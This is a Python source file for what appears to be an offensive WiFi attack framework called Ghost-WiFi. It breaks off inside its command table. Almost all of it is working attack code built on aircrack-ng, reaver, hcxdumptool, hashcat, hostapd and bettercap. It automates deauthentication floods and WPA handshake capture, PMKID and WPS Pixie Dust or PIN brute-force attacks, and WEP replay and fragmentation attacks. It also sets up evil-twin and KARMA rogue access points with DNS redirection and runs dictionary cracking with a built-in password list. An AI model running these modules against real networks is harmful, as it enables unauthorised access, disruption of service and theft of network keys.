#!/usr/bin/env python3
"""
  GHOST-WIFI  v1.0.0  |  WiFi Attack & Audit Framework
  By Gh0st-Bx1        |  github.com/Ghost-Bx1
"""

import argparse
import json
import os
import re
import shutil
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime
from pathlib import Path

# ─── Colors ───────────────────────────────────────────────────────────────────
try:
    import colorama
    colorama.init(autoreset=True)
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
    W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"
except ImportError:
    R = G = Y = B = M = C = W = DIM = RST = ""

BANNER = f"""
{R}  GHOST-WIFI  v1.0.0  |  WiFi Attack & Audit Framework{RST}
{DIM}  By Gh0st-Bx1        |  github.com/Ghost-Bx1{RST}
"""

# ─── Helpers ──────────────────────────────────────────────────────────────────

def print_banner():
    print(BANNER)

def err(msg):
    print(f"{R}[!]{RST} {msg}")

def ok(msg):
    print(f"{G}[+]{RST} {msg}")

def info(msg):
    print(f"{C}[*]{RST} {msg}")

def warn(msg):
    print(f"{Y}[~]{RST} {msg}")

def run(cmd, capture=True, timeout=30):
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=capture,
            text=True, timeout=timeout
        )
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", 1
    except Exception as e:
        return "", str(e), 1

def require_tool(*tools):
    missing = [t for t in tools if not shutil.which(t)]
    if missing:
        err(f"Required tools not found: {', '.join(missing)}")
        info("Install: sudo apt install aircrack-ng iw wireless-tools")
        sys.exit(1)

def require_root():
    if os.geteuid() != 0:
        err("This module requires root privileges.")
        sys.exit(1)

def get_interfaces():
    out, _, _ = run("iw dev 2>/dev/null")
    ifaces = re.findall(r"Interface (\S+)", out)
    if not ifaces:
        out2, _, _ = run("iwconfig 2>/dev/null")
        ifaces = re.findall(r"^(\S+)\s+IEEE", out2, re.MULTILINE)
    return ifaces

def get_monitor_interfaces():
    out, _, _ = run("iw dev 2>/dev/null")
    return re.findall(r"Interface (\S+)\n\s+type monitor", out)

def save_json(data, path):
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)
    ok(f"Results saved to {path}")

# ─── Module: interfaces ───────────────────────────────────────────────────────

def cmd_ifaces(args):
    if not args.no_banner:
        print_banner()
    ifaces = get_interfaces()
    if not ifaces:
        warn("No wireless interfaces found.")
        return
    print(f"\n{W}{'Interface':<12} {'Mode':<12} {'Driver':<20} {'MAC'}{RST}")
    print("-" * 60)
    results = []
    for iface in ifaces:
        out, _, _ = run(f"iw dev {iface} info 2>/dev/null")
        mode = re.search(r"type (\S+)", out)
        mode = mode.group(1) if mode else "unknown"
        mac = re.search(r"addr ([\da-f:]+)", out)
        mac = mac.group(1) if mac else "unknown"
        drv, _, _ = run(f"ethtool -i {iface} 2>/dev/null | grep driver | awk '{{print $2}}'")
        drv = drv.strip() or "unknown"
        print(f"  {iface:<12} {mode:<12} {drv:<20} {mac}")
        results.append({"interface": iface, "mode": mode, "driver": drv, "mac": mac})
    if args.output:
        save_json({"interfaces": results}, args.output)

# ─── Module: monitor ──────────────────────────────────────────────────────────

def cmd_monitor(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airmon-ng")
    iface = args.interface

    if args.action == "start":
        info(f"Starting monitor mode on {iface}...")
        run("airmon-ng check kill", capture=False)
        out, err_s, rc = run(f"airmon-ng start {iface}")
        mon = re.search(r"monitor mode (?:enabled|vif) (?:on|added) for \[?\S+\]?; ?\(?\S*\)?(\w+mon\d*|\w+mon)", out)
        if not mon:
            mon = re.search(r"(\w+mon\d*)", out)
        mon_iface = mon.group(1) if mon else f"{iface}mon"
        ok(f"Monitor interface: {mon_iface}")
        if args.channel:
            run(f"iwconfig {mon_iface} channel {args.channel}")
            ok(f"Set channel {args.channel}")

    elif args.action == "stop":
        info(f"Stopping monitor mode on {iface}...")
        run(f"airmon-ng stop {iface}")
        run("service NetworkManager start 2>/dev/null || systemctl start NetworkManager 2>/dev/null")
        ok("Monitor mode stopped, networking restored.")

    elif args.action == "check":
        out, _, _ = run(f"iw dev {iface} info")
        mode = re.search(r"type (\S+)", out)
        if mode:
            info(f"{iface} is in {mode.group(1)} mode")
        else:
            warn(f"Could not determine mode for {iface}")

# ─── Module: scan ─────────────────────────────────────────────────────────────

def cmd_scan(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng")
    mon = args.interface
    if not mon:
        mons = get_monitor_interfaces()
        if not mons:
            err("No monitor interface found. Run: ghost-wifi.py monitor --interface wlan0 --action start")
            sys.exit(1)
        mon = mons[0]
        info(f"Using monitor interface: {mon}")

    duration = args.duration or 30
    out_prefix = tempfile.mktemp(prefix="/tmp/ghostwifi_scan_")

    info(f"Scanning for {duration}s on {mon}...")
    band = f"--band {args.band}" if args.band else ""
    ch = f"--channel {args.channel}" if args.channel else ""

    proc = subprocess.Popen(
        f"airodump-ng {mon} {band} {ch} --write {out_prefix} --output-format csv -a",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    try:
        time.sleep(duration)
    finally:
        proc.terminate()
        proc.wait()

    csv_file = f"{out_prefix}-01.csv"
    if not os.path.exists(csv_file):
        err(f"No scan output at {csv_file}")
        return

    aps, clients = _parse_airodump_csv(csv_file)
    _print_scan_results(aps, clients, args.verbose)

    result = {"aps": aps, "clients": clients, "scan_time": datetime.now().isoformat()}
    if args.output:
        save_json(result, args.output)

    # cleanup tmp
    for f in Path("/tmp").glob("ghostwifi_scan_*"):
        f.unlink(missing_ok=True)

def _parse_airodump_csv(csv_file):
    aps, clients = [], []
    section = "ap"
    with open(csv_file, errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if "Station MAC" in line:
                section = "client"
                continue
            if section == "ap" and "," in line and not line.startswith("BSSID"):
                p = [x.strip() for x in line.split(",")]
                if len(p) >= 14 and re.match(r"[0-9A-Fa-f:]{17}", p[0]):
                    aps.append({
                        "bssid": p[0], "first_seen": p[1], "last_seen": p[2],
                        "channel": p[3], "speed": p[4], "privacy": p[5],
                        "cipher": p[6], "auth": p[7], "power": p[8],
                        "beacons": p[9], "iv": p[10], "lan_ip": p[11],
                        "id_length": p[12], "essid": p[13].strip('"'),
                        "key": p[14] if len(p) > 14 else ""
                    })
            elif section == "client" and "," in line and not line.startswith("Station"):
                p = [x.strip() for x in line.split(",")]
                if len(p) >= 6 and re.match(r"[0-9A-Fa-f:]{17}", p[0]):
                    clients.append({
                        "mac": p[0], "first_seen": p[1], "last_seen": p[2],
                        "power": p[3], "packets": p[4],
                        "bssid": p[5], "probed_essids": ",".join(p[6:]).strip()
                    })
    return aps, clients

def _print_scan_results(aps, clients, verbose=False):
    print(f"\n{W}{'BSSID':<19} {'CH':<4} {'PWR':<5} {'ENC':<10} {'ESSID'}{RST}")
    print("-" * 70)
    for ap in sorted(aps, key=lambda x: int(x["power"]) if x["power"].lstrip("-").isdigit() else 0):
        enc = ap["privacy"]
        color = R if "WEP" in enc else (Y if "WPS" in enc else G)
        hidden = "[hidden]" if not ap["essid"] else ap["essid"]
        print(f"  {ap['bssid']:<19} {ap['channel']:<4} {ap['power']:<5} {color}{enc:<10}{RST} {hidden}")

    if clients:
        print(f"\n{W}{'CLIENT MAC':<19} {'PWR':<5} {'BSSID':<19} PROBED ESSIDs{RST}")
        print("-" * 70)
        for c in clients:
            print(f"  {c['mac']:<19} {c['power']:<5} {c['bssid']:<19} {c['probed_essids']}")

    ok(f"Found {len(aps)} APs, {len(clients)} clients")

# ─── Module: hop (channel hopping) ────────────────────────────────────────────

def cmd_hop(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("iwconfig")
    iface = args.interface
    channels = list(range(1, 15)) if not args.channels else [int(c) for c in args.channels.split(",")]
    delay = args.delay or 0.5
    info(f"Hopping channels {channels} on {iface} every {delay}s. Ctrl+C to stop.")
    try:
        while True:
            for ch in channels:
                run(f"iwconfig {iface} channel {ch}")
                if args.verbose:
                    info(f"Channel {ch}")
                time.sleep(delay)
    except KeyboardInterrupt:
        ok("Channel hopping stopped.")

# ─── Module: deauth ───────────────────────────────────────────────────────────

def cmd_deauth(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("aireplay-ng")
    mon = args.interface
    bssid = args.bssid
    client = args.client or "FF:FF:FF:FF:FF:FF"
    count = args.count or 0  # 0 = continuous

    info(f"Deauth attack -> AP: {bssid}, Client: {client}, Count: {count or 'continuous'}")
    warn("Use only on networks you own or have authorization to test.")

    ch_cmd = f"--ignore-negative-one" if args.channel else ""
    if args.channel:
        run(f"iwconfig {mon} channel {args.channel}")

    cmd_str = f"aireplay-ng --deauth {count} -a {bssid} -c {client} {mon}"
    if count == 0:
        info("Press Ctrl+C to stop...")
        try:
            subprocess.run(cmd_str, shell=True)
        except KeyboardInterrupt:
            ok("Deauth stopped.")
    else:
        out, _, rc = run(cmd_str, timeout=60)
        if rc == 0:
            ok(f"Sent {count} deauth frames to {client}")
        else:
            err("Deauth failed. Is the interface in monitor mode?")

# ─── Module: capture (WPA handshake) ──────────────────────────────────────────

def cmd_capture(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng", "aireplay-ng")
    mon = args.interface
    bssid = args.bssid
    essid = args.essid or bssid
    channel = args.channel
    out_prefix = args.output or f"capture_{bssid.replace(':','')}"

    if channel:
        run(f"iwconfig {mon} channel {channel}")
        ok(f"Set channel {channel}")

    info(f"Capturing handshake from {essid} ({bssid}) on channel {channel or 'auto'}...")
    info(f"Output prefix: {out_prefix}")

    proc = subprocess.Popen(
        f"airodump-ng -c {channel or 1} --bssid {bssid} -w {out_prefix} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    handshake_found = False
    start = time.time()
    timeout = args.timeout or 120

    # Send deauth bursts to trigger handshake
    if not args.passive:
        info("Sending deauth frames to trigger handshake...")
        for i in range(5):
            if time.time() - start > timeout:
                break
            run(f"aireplay-ng --deauth 5 -a {bssid} {mon}", timeout=10)
            time.sleep(3)
            # Check for handshake in cap file
            cap_file = f"{out_prefix}-01.cap"
            if os.path.exists(cap_file):
                out, _, _ = run(f"aircrack-ng {cap_file} 2>&1 | grep 'handshake'")
                if "handshake" in out.lower():
                    handshake_found = True
                    ok(f"Handshake captured in {cap_file}")
                    break
            if handshake_found:
                break
    else:
        info(f"Passive mode - waiting {timeout}s for handshake...")
        time.sleep(timeout)
        cap_file = f"{out_prefix}-01.cap"
        if os.path.exists(cap_file):
            out, _, _ = run(f"aircrack-ng {cap_file} 2>&1")
            if "handshake" in out.lower():
                handshake_found = True

    proc.terminate()
    proc.wait()

    cap_file = f"{out_prefix}-01.cap"
    if handshake_found:
        ok(f"Handshake saved: {cap_file}")
        ok(f"Crack with: ghost-wifi.py crack --cap {cap_file} --wordlist rockyou.txt")
    else:
        warn(f"Handshake not confirmed. Check {cap_file} manually.")
        info(f"Manual check: aircrack-ng {cap_file}")

# ─── Module: pmkid ────────────────────────────────────────────────────────────

def cmd_pmkid(args):
    if not args.no_banner:
        print_banner()
    require_root()
    info("PMKID attack - clientless WPA2 key capture")

    if shutil.which("hcxdumptool") and shutil.which("hcxtools"):
        _pmkid_hcxtools(args)
    else:
        warn("hcxdumptool/hcxtools not found. Install for PMKID attack:")
        info("  sudo apt install hcxdumptool hcxtools")
        info("Attempting fallback with bettercap...")
        _pmkid_hint(args)

def _pmkid_hcxtools(args):
    mon = args.interface
    bssid = args.bssid
    out = args.output or "pmkid_capture.pcapng"
    filter_opt = f"--filterlist_ap={bssid.replace(':','').lower()} --filtermode=2" if bssid else ""
    duration = args.duration or 60

    info(f"Capturing PMKID on {mon} for {duration}s...")
    proc = subprocess.Popen(
        f"hcxdumptool -i {mon} -o {out} --enable_status=1 {filter_opt}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    try:
        time.sleep(duration)
    finally:
        proc.terminate()
        proc.wait()

    hash_file = out.replace(".pcapng", ".hc22000")
    run(f"hcxpcapngtool -o {hash_file} {out}")

    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        ok(f"PMKID hashes saved: {hash_file}")
        ok(f"Crack with: hashcat -m 22000 {hash_file} wordlist.txt")
    else:
        warn(f"No PMKID hashes captured. Try longer duration or move closer to AP.")

def _pmkid_hint(args):
    warn("Manual PMKID capture commands:")
    print(f"""
  # With bettercap:
  sudo bettercap -iface {args.interface or 'wlan0mon'}
  > wifi.recon on
  > wifi.assoc all

  # Convert pcap to hashcat format:
  hcxpcapngtool -o hashes.hc22000 capture.pcapng

  # Crack:
  hashcat -m 22000 hashes.hc22000 wordlist.txt
""")

# ─── Module: wps ──────────────────────────────────────────────────────────────

def cmd_wps(args):
    if not args.no_banner:
        print_banner()
    require_root()
    bssid = args.bssid
    iface = args.interface
    channel = args.channel or 1

    if args.action == "scan":
        require_tool("wash")
        info(f"Scanning for WPS-enabled APs on {iface}...")
        out, _, _ = run(f"wash -i {iface} 2>/dev/null", timeout=30)
        print(out)

    elif args.action == "pixie":
        require_tool("reaver")
        info(f"WPS Pixie Dust attack on {bssid}...")
        warn("This may take several minutes.")
        out, _, rc = run(
            f"reaver -i {iface} -b {bssid} -c {channel} -K 1 -vv",
            capture=False, timeout=600
        )

    elif args.action == "pin":
        require_tool("reaver")
        pin = args.pin or ""
        pin_opt = f"-p {pin}" if pin else ""
        info(f"WPS PIN brute-force on {bssid}...")
        warn("This is slow (may take hours). Use Pixie Dust first.")
        try:
            subprocess.run(
                f"reaver -i {iface} -b {bssid} -c {channel} {pin_opt} -vv",
                shell=True, timeout=3600
            )
        except KeyboardInterrupt:
            info("WPS PIN attack interrupted.")

    elif args.action == "bully":
        if shutil.which("bully"):
            info(f"Bully WPS attack on {bssid}...")
            try:
                subprocess.run(
                    f"bully {iface} -b {bssid} -c {channel} -d",
                    shell=True
                )
            except KeyboardInterrupt:
                pass
        else:
            warn("bully not found. Install: sudo apt install bully")

# ─── Module: evil-twin ────────────────────────────────────────────────────────

def cmd_eviltwin(args):
    if not args.no_banner:
        print_banner()
    require_root()
    essid = args.essid
    bssid = args.bssid
    iface = args.interface
    channel = args.channel or 6

    info(f"Setting up Evil Twin AP: {essid} (channel {channel})")

    if shutil.which("hostapd") and shutil.which("dnsmasq"):
        _eviltwin_hostapd(iface, essid, channel, bssid, args)
    else:
        warn("hostapd/dnsmasq not found. Install for Evil Twin:")
        info("  sudo apt install hostapd dnsmasq")
        _eviltwin_hint(iface, essid, channel)

def _eviltwin_hostapd(iface, essid, channel, bssid, args):
    hostapd_conf = f"""\
interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    dnsmasq_conf = f"""\
interface={iface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
"""
    conf_dir = tempfile.mkdtemp(prefix="/tmp/ghostwifi_")
    hconf = f"{conf_dir}/hostapd.conf"
    dconf = f"{conf_dir}/dnsmasq.conf"

    with open(hconf, "w") as f:
        f.write(hostapd_conf)
    with open(dconf, "w") as f:
        f.write(dnsmasq_conf)

    run(f"ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0")
    run("iptables -t nat -A POSTROUTING -j MASQUERADE")
    run("echo 1 > /proc/sys/net/ipv4/ip_forward")

    ok(f"Evil Twin AP '{essid}' starting on {iface} channel {channel}")
    info(f"Config: {hconf}")
    info("Press Ctrl+C to stop...")

    procs = []
    try:
        procs.append(subprocess.Popen(f"dnsmasq -C {dconf} -d", shell=True))
        procs.append(subprocess.Popen(f"hostapd {hconf}", shell=True))
        signal.pause()
    except (KeyboardInterrupt, AttributeError):
        for p in procs:
            p.terminate()
        run("iptables -t nat -F")
        run("echo 0 > /proc/sys/net/ipv4/ip_forward")
        ok("Evil Twin stopped.")

def _eviltwin_hint(iface, essid, channel):
    print(f"""
  Manual Evil Twin setup:

  # hostapd.conf:
  interface={iface}
  ssid={essid}
  channel={channel}
  hw_mode=g

  # Run:
  sudo hostapd /tmp/hostapd.conf
  sudo dnsmasq --interface={iface} --dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h

  # Or use airbase-ng:
  sudo airbase-ng -e "{essid}" -c {channel} {iface}
""")

# ─── Module: crack ────────────────────────────────────────────────────────────

def cmd_crack(args):
    if not args.no_banner:
        print_banner()
    cap = args.cap
    wordlist = args.wordlist
    essid = args.essid or ""

    if not os.path.exists(cap):
        err(f"Capture file not found: {cap}")
        sys.exit(1)

    if args.hashcat:
        _crack_hashcat(args)
    else:
        _crack_aircrack(cap, wordlist, essid, args)

def _crack_aircrack(cap, wordlist, essid, args):
    require_tool("aircrack-ng")
    essid_opt = f'-e "{essid}"' if essid else ""
    rules = ""

    info(f"Cracking {cap} with aircrack-ng...")
    if not wordlist:
        warn("No wordlist specified. Using built-in mini-list.")
        wl_path = tempfile.mktemp(suffix=".txt")
        with open(wl_path, "w") as f:
            f.write("\n".join(MINI_WORDLIST))
        wordlist = wl_path

    cmd_str = f"aircrack-ng {essid_opt} -w {wordlist} {cap}"
    out, _, rc = run(cmd_str, timeout=3600)
    print(out)
    m = re.search(r"KEY FOUND! \[ (.+?) \]", out)
    if m:
        ok(f"Password found: {m.group(1)}")
    else:
        warn("Password not found with this wordlist.")
        info("Try: ghost-wifi.py crack --cap capture.cap --wordlist /usr/share/wordlists/rockyou.txt")

def _crack_hashcat(args):
    require_tool("hashcat")
    hfile = args.cap
    wordlist = args.wordlist or "/usr/share/wordlists/rockyou.txt"
    mode = args.hash_mode or 22000
    rules = f"-r {args.rules}" if args.rules else ""

    info(f"Cracking with hashcat (mode {mode})...")
    cmd_str = f"hashcat -m {mode} {hfile} {wordlist} {rules} --status --potfile-path /tmp/ghostwifi.pot"
    try:
        subprocess.run(cmd_str, shell=True)
    except KeyboardInterrupt:
        pass
    # Show results
    out, _, _ = run(f"hashcat -m {mode} {hfile} --show --potfile-path /tmp/ghostwifi.pot")
    if out.strip():
        ok("Cracked hashes:")
        print(out)

# ─── Module: wep ──────────────────────────────────────────────────────────────

def cmd_wep(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng", "aireplay-ng", "aircrack-ng")
    mon = args.interface
    bssid = args.bssid
    channel = args.channel or 1
    out = args.output or f"wep_{bssid.replace(':','')}"

    info(f"WEP attack on {bssid} (channel {channel})")
    run(f"iwconfig {mon} channel {channel}")

    proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {out} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    if args.attack == "arp":
        info("ARP replay attack...")
        # First do fake authentication
        run(f"aireplay-ng -1 0 -a {bssid} {mon}", timeout=15)
        time.sleep(2)
        try:
            subprocess.run(
                f"aireplay-ng -3 -b {bssid} {mon}",
                shell=True, timeout=600
            )
        except KeyboardInterrupt:
            pass

    elif args.attack == "frag":
        info("Fragmentation attack...")
        run(f"aireplay-ng -1 0 -a {bssid} {mon}", timeout=15)
        try:
            subprocess.run(f"aireplay-ng -5 -b {bssid} {mon}", shell=True, timeout=120)
        except KeyboardInterrupt:
            pass
        # Forge ARP
        if shutil.which("packetforge-ng"):
            run(f"packetforge-ng -0 -a {bssid} -k 255.255.255.255 -l 255.255.255.255 -y replay_dec*.xor -w forged.cap")
            try:
                subprocess.run(f"aireplay-ng -2 -r forged.cap {mon}", shell=True, timeout=600)
            except KeyboardInterrupt:
                pass

    elif args.attack == "chopchop":
        info("ChopChop attack...")
        run(f"aireplay-ng -1 0 -a {bssid} {mon}", timeout=15)
        try:
            subprocess.run(f"aireplay-ng -4 -b {bssid} {mon}", shell=True, timeout=180)
        except KeyboardInterrupt:
            pass

    proc.terminate()
    cap = f"{out}-01.cap"
    info(f"Attempting to crack WEP key from {cap}...")
    out_crack, _, _ = run(f"aircrack-ng {cap}", timeout=120)
    print(out_crack)
    m = re.search(r"KEY FOUND! \[ (.+?) \]", out_crack)
    if m:
        ok(f"WEP key: {m.group(1)}")

# ─── Module: clients ──────────────────────────────────────────────────────────

def cmd_clients(args):
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng")
    mon = args.interface
    bssid = args.bssid
    channel = args.channel

    if channel:
        run(f"iwconfig {mon} channel {channel}")

    duration = args.duration or 30
    out_prefix = tempfile.mktemp(prefix="/tmp/ghostwifi_clients_")

    info(f"Tracking clients on {mon} for {duration}s...")
    bssid_opt = f"--bssid {bssid}" if bssid else ""
    ch_opt = f"-c {channel}" if channel else ""

    proc = subprocess.Popen(
        f"airodump-ng {bssid_opt} {ch_opt} -w {out_prefix} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate()

    csv = f"{out_prefix}-01.csv"
    if os.path.exists(csv):
        _, clients = _parse_airodump_csv(csv)
        print(f"\n{W}{'CLIENT MAC':<19} {'PWR':<5} {'BSSID':<19} PROBED ESSIDs{RST}")
        print("-" * 70)
        for c in clients:
            print(f"  {c['mac']:<19} {c['power']:<5} {c['bssid']:<19} {c['probed_essids']}")
        ok(f"Found {len(clients)} clients")
        if args.output:
            save_json({"clients": clients}, args.output)

    for f in Path("/tmp").glob("ghostwifi_clients_*"):
        f.unlink(missing_ok=True)

# ─── Module: karma ────────────────────────────────────────────────────────────

def cmd_karma(args):
    if not args.no_banner:
        print_banner()
    require_root()
    info("KARMA attack - respond to all probe requests with matching AP")

    if shutil.which("hostapd-wpe"):
        info(f"Using hostapd-wpe on {args.interface}...")
        subprocess.run(f"hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf", shell=True)
    elif shutil.which("bettercap"):
        info("Using bettercap for KARMA attack...")
        script = "wifi.recon on; set wifi.ap.ssid .; wifi.ap on"
        subprocess.run(
            f"bettercap -iface {args.interface} -eval '{script}'",
            shell=True
        )
    else:
        warn("No KARMA tool found. Install hostapd-wpe or bettercap:")
        info("  sudo apt install bettercap")
        print(f"""
  Manual KARMA with airbase-ng:
  sudo airbase-ng -P -C 30 -e "" {args.interface}
  (-P = respond to all probes, -C = respond to broadcast probes for 30s)
""")

# ─── Module: handshake tools ──────────────────────────────────────────────────

def cmd_handshake(args):
    if not args.no_banner:
        print_banner()
    cap = args.cap

    if args.action == "verify":
        require_tool("aircrack-ng")
        out, _, _ = run(f"aircrack-ng {cap} 2>&1")
        if "handshake" in out.lower():
            ok(f"Valid handshake found in {cap}")
        else:
            warn(f"No valid handshake detected in {cap}")
        print(out[:500])

    elif args.action == "convert":
        if shutil.which("hcxpcapngtool"):
            out_hc = args.output or cap.replace(".cap", ".hc22000")
            run(f"hcxpcapngtool -o {out_hc} {cap}")
            ok(f"Converted to hashcat format: {out_hc}")
        elif shutil.which("cap2hccapx"):
            out_hc = args.output or cap.replace(".cap", ".hccapx")
            run(f"cap2hccapx {cap} {out_hc}")
            ok(f"Converted: {out_hc}")
        else:
            warn("hcxpcapngtool/cap2hccapx not found.")
            info("Install: sudo apt install hcxtools")

    elif args.action == "strip":
        # Remove non-handshake packets
        if shutil.which("wpaclean"):
            out_clean = args.output or cap.replace(".cap", "_clean.cap")
            run(f"wpaclean {out_clean} {cap}")
            ok(f"Cleaned capture: {out_clean}")
        else:
            warn("wpaclean not found (part of aircrack-ng suite)")

# ─── Module: info ─────────────────────────────────────────────────────────────

def cmd_info(args):
    if not args.no_banner:
        print_banner()
    print(f"\n{W}Ghost-WiFi Dependency Check{RST}\n")
    tools = {
        "aircrack-ng": ("Core - WEP/WPA cracking", True),
        "airodump-ng": ("Core - packet capture/scan", True),
        "aireplay-ng": ("Core - injection/deauth", True),
        "airmon-ng":   ("Core - monitor mode", True),
        "airbase-ng":  ("Core - AP emulation", False),
        "wash":        ("WPS - scan for WPS APs", False),
        "reaver":      ("WPS - Pixie Dust/PIN brute", False),
        "bully":       ("WPS - alternative WPS attack", False),
        "hcxdumptool": ("PMKID - clientless capture", False),
        "hcxpcapngtool":("PMKID - convert to hashcat", False),
        "hashcat":     ("Cracking - GPU acceleration", False),
        "john":        ("Cracking - CPU-based cracking", False),
        "hostapd":     ("Evil Twin/KARMA - AP daemon", False),
        "dnsmasq":     ("Evil Twin - DHCP/DNS server", False),
        "bettercap":   ("KARMA/MITM - all-in-one framework", False),
        "iw":          ("WiFi management", True),
        "iwconfig":    ("WiFi config (legacy)", False),
        "macchanger":  ("MAC address spoofing", False),
        "wireshark":   ("Packet analysis", False),
        "tshark":      ("CLI packet analysis", False),
    }
    for tool, (desc, required) in tools.items():
        found = shutil.which(tool) is not None
        status = f"{G}[OK]{RST}" if found else (f"{R}[MISSING - required]{RST}" if required else f"{Y}[not found]{RST}")
        print(f"  {status} {tool:<20} {DIM}{desc}{RST}")

    print(f"\n{W}Install missing tools:{RST}")
    print("  sudo apt install aircrack-ng reaver bully hcxdumptool hcxtools hashcat hostapd dnsmasq bettercap macchanger")

# ─── Built-in mini wordlist ───────────────────────────────────────────────────

MINI_WORDLIST = [
    "password", "12345678", "123456789", "1234567890", "password1",
    "qwerty123", "abc123456", "letmein1", "monkey123", "dragon123",
    "admin", "admin123", "root", "toor", "pass", "test", "12345",
    "password123", "iloveyou", "sunshine", "princess", "welcome",
    "shadow", "master", "batman", "superman", "1q2w3e4r",
]

# ─── Argument Parser ──────────────────────────────────────────────────────────

def build_parser():
    p = argparse.ArgumentParser(
        prog="ghost-wifi",
        description="Ghost-WiFi - WiFi Attack & Audit Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    p.add_argument("--no-banner", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-o", "--output", help="Save output to JSON/file")

    sub = p.add_subparsers(dest="command", required=True)

    # ifaces
    sub.add_parser("ifaces", help="List wireless interfaces")

    # monitor
    mon = sub.add_parser("monitor", help="Manage monitor mode")
    mon.add_argument("-i", "--interface", required=True)
    mon.add_argument("--action", choices=["start", "stop", "check"], default="start")
    mon.add_argument("--channel", type=int)

    # scan
    sc = sub.add_parser("scan", help="Scan for APs and clients")
    sc.add_argument("-i", "--interface")
    sc.add_argument("--channel", type=int)
    sc.add_argument("--band", choices=["a", "b", "abg", "abgn"])
    sc.add_argument("--duration", type=int, default=30)

    # hop
    hop = sub.add_parser("hop", help="Channel hopping")
    hop.add_argument("-i", "--interface", required=True)
    hop.add_argument("--channels", help="Comma-separated channels (default: 1-14)")
    hop.add_argument("--delay", type=float, default=0.5)

    # deauth
    da = sub.add_parser("deauth", help="Deauthentication attack")
    da.add_argument("-i", "--interface", required=True)
    da.add_argument("--bssid", required=True, help="Target AP MAC")
    da.add_argument("--client", default="FF:FF:FF:FF:FF:FF", help="Client MAC (default: broadcast)")
    da.add_argument("--channel", type=int)
    da.add_argument("--count", type=int, default=0, help="Deauth frames (0=continuous)")

    # capture
    cap = sub.add_parser("capture", help="Capture WPA/WPA2 4-way handshake")
    cap.add_argument("-i", "--interface", required=True)
    cap.add_argument("--bssid", required=True)
    cap.add_argument("--essid")
    cap.add_argument("--channel", type=int)
    cap.add_argument("--passive", action="store_true", help="No deauth, passive capture only")
    cap.add_argument("--timeout", type=int, default=120)

    # pmkid
    pm = sub.add_parser("pmkid", help="Clientless PMKID attack")
    pm.add_argument("-i", "--interface", required=True)
    pm.add_argument("--bssid", help="Target AP MAC (optional, all if omitted)")
    pm.add_argument("--duration", type=int, default=60)

    # wps
    wps = sub.add_parser("wps", help="WPS attacks (Pixie Dust, PIN)")
    wps.add_argument("-i", "--interface", required=True)
    wps.add_argument("--bssid")
    wps.add_argument("--channel", type=int, default=1)
    wps.add_argument("--action", choices=["scan", "pixie", "pin", "bully"], default="scan")
    wps.add_argument("--pin", help="Known WPS PIN to test")

    # evil-twin
    et = sub.add_parser("evil-twin", help="Evil Twin / Rogue AP")
    et.add_argument("-i", "--interface", required=True)
    et.add_argument("--essid", required=True, help="SSID to impersonate")
    et.add_argument("--bssid", help="BSSID to spoof")
    et.add_argument("--channel", type=int, default=6)
    et.add_argument("--captive-portal", action="store_true")

    # crack
    cr = sub.add_parser("crack", help="Crack handshake (aircrack-ng or hashcat)")
    cr.add_argument("--cap", required=True, help="Capture file (.cap or .hc22000)")
    cr.add_argument("--wordlist", help="Wordlist file")
    cr.add_argument("--essid", help="Target ESSID")
    cr.add_argument("--hashcat", action="store_true", help="Use hashcat instead of aircrack-ng")
    cr.add_argument("--hash-mode", type=int, default=22000)
    cr.add_argument("--rules", help="Hashcat rules file")

    # wep
    wep = sub.add_parser("wep", help="WEP cracking")
    wep.add_argument("-i", "--interface", required=True)
    wep.add_argument("--bssid", required=True)
    wep.add_argument("--channel", type=int, default=1)
    wep.add_argument("--attack", choices=["arp", "frag", "chopchop"], default="arp")

    # clients
    cl = sub.add_parser("clients", help="Track and log clients")
    cl.add_argument("-i", "--interface", required=True)
    cl.add_argument("--bssid")
    cl.add_argument("--channel", type=int)
    cl.add_argument("--duration", type=int, default=30)

    # karma
    ka = sub.add_parser("karma", help="KARMA attack - respond to all probes")
    ka.add_argument("-i", "--interface", required=True)

    # handshake
    hs = sub.add_parser("handshake", help="Handshake tools (verify, convert, strip)")
    hs.add_argument("--cap", required=True)
    hs.add_argument("--action", choices=["verify", "convert", "strip"], default="verify")

    # info
    sub.add_parser("info", help="Check tool dependencies")

    return p

# ─── Entry point ──────────────────────────────────────────────────────────────

COMMANDS = {
    "ifaces":    cmd_ifaces,
    "monitor":   cmd_monitor,
    "scan":      cmd_scan,
    "hop":       cmd_hop,
